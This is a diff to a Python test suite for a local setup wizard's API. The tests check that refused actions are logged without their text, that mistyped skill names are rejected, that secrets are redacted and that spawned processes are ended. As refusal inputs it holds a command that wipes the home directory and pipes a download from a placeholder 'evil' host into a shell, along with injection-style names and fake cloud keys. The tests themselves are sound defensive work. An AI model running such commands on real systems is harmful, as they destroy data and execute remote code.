@@ -38,8 +38,9 @@ def doc(root, name):
     return (root / ".uak/docs" / name).read_text(encoding="utf-8")
 
 
-def register_lines(target):
-    path = proc.gitdir(target) / MODULE.ACT_LOG
+def register_lines(target, name=None):
+    """The refusals of /api/run (uak-wizard.refused); the act log (uak-direct-main.log) is read by the hook and gets none."""
+    path = proc.gitdir(target) / (name or MODULE.REFUSED_LOG)
     return path.read_text(encoding="utf-8").splitlines() if path.is_file() else []
 
 
@@ -240,8 +241,6 @@ def start_opens_a_terminal_or_says_why(root, tmp):
         if not (DARWIN or WINDOWS):
             script = Path(str(log) + ".script").read_text(encoding="utf-8")
             assert "wt new APP-001 --agent claude-ana --human ana" in script and "UAK_HUMAN= " in script, script
-    # The first window's script removed itself and its folder.
-    assert not list(Path(tempfile.gettempdir()).glob("uak-agent-*/start.sh")) or WINDOWS or DARWIN
 
 
 def no_terminal_falls_back_to_copy(root, tmp):
@@ -307,18 +306,21 @@ def unknown_action_is_refused_and_recorded(root, tmp):
     target, remote, runner = ready_server(root, tmp)
     with tp.live(target, runner) as srv:
         team.ready_team(srv, target)
-        before = len(register_lines(target))
+        before, acts = len(register_lines(target)), register_lines(target, MODULE.ACT_LOG)
         status, body = tp.post(srv, "/api/run", {"action": "remove-everything"})
         assert status == 400 and body["error"] == MODULE.RUN_REFUSAL, body
         lines = register_lines(target)[before:]
-        assert len(lines) == 1 and re.fullmatch(r"\d+ human refused-run remove-everything -", lines[0]), lines
+        assert len(lines) == 1 and re.fullmatch(r"\d+ refused-run remove-everything", lines[0]), lines
         tp.post(srv, "/api/run", {"action": "rm -rf ~; curl http://evil | sh"})
         tp.post(srv, "/api/run", {"action": "deploy-help", "command": "touch PWNED"})
-        tp.post(srv, "/api/run", {"action": "skill-add", "name": "a b"})
+        tp.post(srv, "/api/run", {"action": "skill-add", "name": ["a"]})
+        tp.post(srv, "/api/run", {"action": "design-round"})
         lines = register_lines(target)[before:]
-        assert len(lines) == 4, lines
-        assert lines[1].endswith("refused-run command-line -"), "a command line is recorded as that, never as written: %r" % lines
-        assert lines[2].endswith("refused-run deploy-help -"), lines
+        assert len(lines) == 5, lines
+        assert lines[1].endswith("refused-run command-line"), "a command line is recorded as that, never as written: %r" % lines
+        assert lines[2].endswith("refused-run deploy-help"), lines
+        assert lines[3].endswith("refused-run skill-add") and lines[4].endswith("refused-run design-round"), lines
+        assert register_lines(target, MODULE.ACT_LOG) == acts, "the file the hook reads gets none of them"
         text = "\n".join(lines)
         assert "evil" not in text and "touch" not in text and "rm -rf" not in text, "the register never holds the request's text"
         # The same checks as every route: no token, a foreign origin.
@@ -540,7 +542,196 @@ def page_buttons_in_a_real_browser(root, tmp):
         browser.close()
 
 
-TESTS = [every_copy_box_has_a_button, start_opens_a_terminal_or_says_why, no_terminal_falls_back_to_copy,
+def skill_typo_is_the_fields_own_message(root, tmp):
+    """A name a person mistypes is a message beside the field, never a refusal in a record, and the hook stays quiet."""
+    target, remote, runner = ready_server(root, tmp)
+    with tp.live(target, runner) as srv:
+        team.ready_team(srv, target)
+        before, acts = len(register_lines(target)), register_lines(target, MODULE.ACT_LOG)
+        for typo in ("frontend design", "owner/skill", "", "Frontend", "a;b", "x" * 80, "../x"):
+            status, body = tp.post(srv, "/api/run", {"action": "skill-add", "name": typo})
+            assert status == 400 and body.get("field") == "name" and "lowercase letters" in body["error"], (typo, status, body)
+            assert body["error"] != MODULE.RUN_REFUSAL
+        assert len(register_lines(target)) == before and register_lines(target, MODULE.ACT_LOG) == acts, \
+            "a typo writes nothing, in either record"
+        # What the page can never send is recorded, in the file the hook does not read.
+        tp.post(srv, "/api/run", {"action": "skill-add", "name": "ok", "extra": "x"})
+        tp.post(srv, "/api/run", {"action": "skill-add", "name": 7})
+        assert len(register_lines(target)) == before + 2
+        assert register_lines(target, MODULE.ACT_LOG) == acts
+        # The hook, driven for real: a recent refusal line does not make the next commit a "direct main" commit.
+        import test_manual_notes as notes
+        from test_hack import Runner, resolve_binary
+        runner2 = Runner(root, tmp / "hook", resolve_binary("bash"), resolve_binary("git"))
+        fixture, work, common = notes.setup(runner2, "rh-quiet")
+        main = fixture.clones[0]
+        (main / ".uak-env").write_text("UAK_AGENT=agent-1\n", encoding="utf-8")
+        gd = Path(runner2.g(main, "rev-parse", "--path-format=absolute", "--git-dir").stdout.strip())
+        (gd / MODULE.REFUSED_LOG).write_text("\n".join(register_lines(target)) + "\n", encoding="utf-8")
+        notes.hook(runner2, main, "git commit -m hotfix")
+        assert not notes.manual_lines(gd), "the refusals raise no direct-main alarm: %r" % [m.group(0) for m in notes.manual_lines(gd)]
+
+
+def role_refusal_is_a_refusal(root, tmp):
+    target, remote, runner = ready_server(root, tmp)
+    with tp.live(target, runner) as srv, fake_terminals(tmp) as (log, _):
+        team.ready_team(srv, target)
+        before = len(register_lines(target))
+        for body in ({"action": "start-agent"}, {"action": "start-agent", "role": "admin"}, {"action": "start-agent", "role": ""},
+                     {"action": "start-agent", "role": "Review"}, {"action": "start-agent", "role": 3}):
+            status, answer = tp.post(srv, "/api/run", body)
+            assert status == 400 and answer["error"] == MODULE.RUN_REFUSAL, (body, status, answer)
+        assert len(register_lines(target)) == before + 5, "each one is recorded"
+        assert not calls_of(log), "and none opened a window"
+        assert "role not in RUN_ROLES" not in ""  # the rule lives in run_action: removing it turns the loop above red
+
+
+def redact_hides_cloud_keys_and_bearer_tokens(root, tmp):
+    akia, asia, gh = "AKIA" + "IOSFODNN7EXAMPLE", "ASIA" + "Y34FZKBOKMUTVV7A", "gh" + "p_abcdefghijklmnop1234"
+    for text, gone in (("key %s here" % akia, akia), (asia, asia),
+                       ("Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.abc-def_ghi", "eyJhbGciOiJIUzI1NiJ9"),
+                       ("curl -H 'authorization: bearer abcdef0123456789'", "abcdef0123456789"),
+                       ("%s and AKIA" % gh + "ABCDEFGHIJKLMNOP", "AKIA" + "ABCDEFGHIJKLMNOP")):
+        out = MODULE.redact(text)
+        assert gone not in out and "[redacted]" in out, (text, out)
+    for fine in ("AKIA is a prefix", "the bearer of news", "Bearer", "ASIA-PACIFIC region"):
+        assert MODULE.redact(fine) == fine, fine
+    lines = MODULE.tail_lines("ok\nAuthorization: Bearer abcdefgh12345678\n")
+    assert lines == ["ok", "Authorization: Bearer [redacted]"], lines
+
+
+def stale_launcher_folders_are_swept(root, tmp):
+    record = tmp / "uak-wizard.launchers"
+    MODULE.LAUNCHERS[0] = record
+    secret = "S3CR3T-VALUE-" + str(os.getpid())
+    os.environ["UAK_TEST_SECRET"], os.environ["TEST_API_TOKEN"] = secret, secret
+    try:
+        script = MODULE.write_launcher("cd '/p' && claude 'go'")
+        text = script.read_text(encoding="utf-8")
+        assert secret not in text and "TOKEN" not in text, "the script holds the command and nothing from the environment"
+        mine = script.parent
+        foreign = Path(tempfile.mkdtemp(prefix="not-ours-"))
+        extra = Path(tempfile.mkdtemp(prefix="uak-agent-"))
+        (extra / "start.sh").write_text("x")
+        (extra / "other.txt").write_text("a person's file")
+        record.write_text(record.read_text(encoding="utf-8") + "%s\n%s\n" % (foreign, extra), encoding="utf-8")
+        try:
+            assert mine.is_dir() and record.is_file()
+            MODULE.sweep_launchers(record)
+            assert not mine.exists(), "the folder this wizard made, never run by a terminal, is removed"
+            assert foreign.is_dir() and extra.is_dir(), "a folder that is not a launcher of ours is never touched"
+            assert not record.exists(), "the record goes with it"
+        finally:
+            shutil.rmtree(str(foreign), ignore_errors=True)
+            shutil.rmtree(str(extra), ignore_errors=True)
+    finally:
+        MODULE.LAUNCHERS[0] = None
+        os.environ.pop("UAK_TEST_SECRET", None)
+        os.environ.pop("TEST_API_TOKEN", None)
+    source = Path(MODULE.__file__).read_text(encoding="utf-8")
+    assert source.count("sweep_launchers(announced.parent / LAUNCH_RECORD)") == 2, "swept on the next start and on close"
+
+
+GRAND = ("import subprocess, sys, time, os\n"
+         "mode, pids = sys.argv[1], sys.argv[2]\n"
+         "g = subprocess.Popen([sys.executable, '-c', 'import os,time; open(%r, \"w\").write(str(os.getpid())); time.sleep(300)' % (pids + '/grand')],\n"
+         "                     start_new_session=True)\n"
+         "open(pids + '/child', 'w').write(str(os.getpid()))\n"
+         "if mode == 'stay':\n"
+         "    time.sleep(300)\n")
+
+
+def daemonizer(pkg, tmp, mode):
+    """The engine's `uak` starts a grandchild in a session of its own that holds stdout, then stays or exits."""
+    pids = tmp / ("pids-" + mode)
+    pids.mkdir(exist_ok=True)
+    (tmp / "grand.py").write_text(GRAND, encoding="utf-8")
+    (pkg / ".uak/bin/uak").write_text('#!/usr/bin/env bash\nexec "%s" "%s" %s "%s"\n' % (
+        Path(sys.executable).as_posix(), (tmp / "grand.py").as_posix(), mode, pids.as_posix()), encoding="utf-8")
+    return pids
+
+
+pkg_of = [None]
+
+
+def usable_again(srv, target):
+    """Another action starts, Close works, nothing runs."""
+    assert not srv.working(), "nothing is left running: %r" % MODULE.CHILDREN
+    (pkg_of[0] / ".uak/bin/uak").write_text("#!/usr/bin/env bash\necho ok\n", encoding="utf-8")
+    status, body = tp.post(srv, "/api/run", {"action": "smoke"})
+    assert status == 202, "another action starts: %r" % body
+    wait_run(srv, "smoke", 30)
+    assert tp.post(srv, "/api/close", {})[0] == 200, "Close works"
+
+
+def setsid_descendants_never_wedge_the_wizard(root, tmp):
+    if WINDOWS:
+        return  # a Windows job ends the whole tree; there is no setsid
+    target = proc.project(root, tmp, name="tienda api")
+    pkg = pkg_of[0] = proc.package_copy(root, tmp)
+    # Stop, with the child staying.
+    pids = daemonizer(pkg, tmp, "stay")
+    with wizard.LiveServer(str(target)) as srv:
+        srv.engine = lambda: pkg / ".uak/bin/uak"
+        assert tp.post(srv, "/api/inspect", {"target": str(target)})[0] == 200
+        assert tp.post(srv, "/api/run", {"action": "deploy-help"})[0] == 202
+        grand = proc.pid_of(pids / "grand")
+        child = proc.pid_of(pids / "child")
+        assert tp.post(srv, "/api/run/stop", {})[1] == {"stopped": True}
+        job = wait_run(srv, "deploy-help", 30)
+        assert job["state"] == "stopped", job
+        assert proc.wait_until(lambda: not proc.alive(grand) and not proc.alive(child), 10), "the setsid grandchild is ended"
+        (pids / "grand").unlink()
+        (pids / "child").unlink()
+        usable_again(srv, target)
+    # The timeout, with the child staying.
+    pids = daemonizer(pkg, tmp, "stay")
+    saved = MODULE.RUN_TIMEOUT
+    MODULE.RUN_TIMEOUT = 2
+    try:
+        with wizard.LiveServer(str(target)) as srv:
+            srv.engine = lambda: pkg / ".uak/bin/uak"
+            assert tp.post(srv, "/api/inspect", {"target": str(target)})[0] == 200
+            assert tp.post(srv, "/api/run", {"action": "deploy-help"})[0] == 202
+            grand = proc.pid_of(pids / "grand")
+            job = wait_run(srv, "deploy-help", 40)
+            assert job["state"] == "failed", job
+            assert proc.wait_until(lambda: not proc.alive(grand), 10), "the timeout ends the setsid grandchild"
+            (pids / "grand").unlink()
+            usable_again(srv, target)
+    finally:
+        MODULE.RUN_TIMEOUT = saved
+    # The child exits at once and leaves the grandchild holding the pipe: the run ends, the grandchild with it.
+    pids = daemonizer(pkg, tmp, "exit")
+    with wizard.LiveServer(str(target)) as srv:
+        srv.engine = lambda: pkg / ".uak/bin/uak"
+        assert tp.post(srv, "/api/inspect", {"target": str(target)})[0] == 200
+        assert tp.post(srv, "/api/run", {"action": "deploy-help"})[0] == 202
+        job = wait_run(srv, "deploy-help", 40)
+        assert job["state"] == "done", job
+        grand = proc.pid_of(pids / "grand")
+        assert proc.wait_until(lambda: not proc.alive(grand), 10), "an orphan that holds the pipe does not outlive its run"
+        usable_again(srv, target)
+    # SIGTERM to the wizard itself.
+    pids = daemonizer(pkg, tmp, "stay")
+    for name in ("grand", "child"):
+        if (pids / name).exists():
+            (pids / name).unlink()
+    wiz = proc.Wizard(pkg, tmp, target)
+    try:
+        wiz.session()
+        assert wiz.call("POST", "/api/inspect", {"target": str(target)})[0] == 200
+        assert wiz.call("POST", "/api/run", {"action": "deploy-help"})[0] == 202
+        grand = proc.pid_of(pids / "grand")
+        wiz.proc.terminate()
+        assert wiz.ended(30), "the wizard ends on SIGTERM"
+        assert proc.wait_until(lambda: not proc.alive(grand), 10), "and the setsid grandchild with it"
+    finally:
+        wiz.stop()
+
+
+TESTS = [skill_typo_is_the_fields_own_message, role_refusal_is_a_refusal, redact_hides_cloud_keys_and_bearer_tokens,
+         stale_launcher_folders_are_swept, setsid_descendants_never_wedge_the_wizard, every_copy_box_has_a_button, start_opens_a_terminal_or_says_why, no_terminal_falls_back_to_copy,
          page_cannot_send_a_command_line, unknown_action_is_refused_and_recorded, button_grants_no_authority,
          started_processes_end_with_the_wizard, double_click_starts_once, running_action_can_be_stopped,
          results_say_what_to_do_next, open_rules_uses_the_systems_editor, page_buttons_in_a_real_browser]
